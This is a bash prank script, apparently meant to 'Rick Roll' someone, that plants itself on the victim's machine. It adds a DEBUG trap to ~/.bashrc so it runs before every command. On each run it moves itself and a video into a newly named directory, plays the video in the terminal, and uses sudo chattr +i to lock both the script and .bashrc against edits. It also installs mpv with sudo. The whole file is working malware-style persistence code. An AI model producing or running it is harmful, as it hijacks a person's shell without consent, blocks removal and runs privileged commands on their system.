#!/bin/bash
#    Rick Rolling Bash Script:
#
# This script after being run once, will run every single time a user tries to use the command line
# Before the user entered command is run, it modifies the .bashrc file to call this script.
# This script makes a new directory, renames itself and the related files, and migrates itself there.
# The command in .bashrc to call this script cannot be overwritten by the user, because this script will overwrite the changes anyway.
# Get rickrolled in ASCII scrub



# if mpv if not installed, then install it
if ! command -v mpv 2>&1 >/dev/null
then
    sudo apt install mpv
fi

# initialize variables for script
randomnum=$RANDOM # random number for directory
newdir=$HOME/FunnyDirectory$randomnum # make new directory name
mkdir $newdir # create new directory
bashrc="$HOME/.bashrc" # .bashrc location
randomnum=$RANDOM # random number for file name
newname="rick$randomnum.sh" # new file name
currentpath=$(readlink -f "$0") # get current file path including name
currentdir=$(dirname "$currentpath") # get current directory path
newpath="$newdir/$newname" # new path with new filename in new directory
newcommand="trap '$newdir/$newname; source $HOME/.bashrc' DEBUG" # new trap command to run file and source .bashrc
source $bashrc # make sure .bashrc is up to date
sudo chattr -i $currentpath # make file mutable
sudo chattr -i $bashrc # make .bashrc mutable

# initialize variables for .mp4
randomnum=$RANDOM # random number
vid=$(ls $currentdir/^_^*.mp4 2>/dev/null) # get the name of the .mp4
newvid="^_^$randomnum.mp4" # make a new name

# if trap command exists, update it to call new script
if grep -q "trap" "$bashrc"; then
    sed -i "s|^trap.*|$newcommand|" "$bashrc"
# if command does not exist, add new trap command
else
    echo "$newcommand" >> "$bashrc"
fi

mv $vid $newdir/$newvid # move the .mp4 to new location

mpv --vo=caca --no-terminal $newdir/$newvid # play video in terminal

mv $currentpath $newpath # move script to new location

sudo chattr +i $newpath # make file immutable
sudo chattr +i $bashrc # make .bashrc immutable

rmdir $currentdir # remove old directory

